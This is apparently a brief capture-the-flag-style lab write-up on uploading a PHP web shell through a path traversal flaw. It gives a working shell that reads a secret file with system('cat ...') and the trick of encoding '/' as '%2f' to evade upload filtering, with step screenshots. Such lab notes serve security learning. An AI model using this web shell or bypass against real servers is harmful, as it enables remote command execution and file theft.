# Web shell upload via path traversal

## File Content
```php
<?php
system("cat /home/carlos/secret");
?>
```

## Uploading
![image](https://user-images.githubusercontent.com/60841283/150630846-e047c5f1-f0b1-46cd-95e1-839280c2c5a7.png)

![image](https://user-images.githubusercontent.com/60841283/150630862-762d35d2-7f0f-4512-b875-749abedbfdb2.png)

![image](https://user-images.githubusercontent.com/60841283/150630900-3be980ed-666d-464d-95c9-212b3ae7a529.png)

Encode "/" --> "%2f"

![image](https://user-images.githubusercontent.com/60841283/150630938-e8607ea4-33e7-42e5-9478-b0e03bb868cb.png)

![image](https://user-images.githubusercontent.com/60841283/150630963-59924a8d-793d-4658-b562-e688812766e8.png)
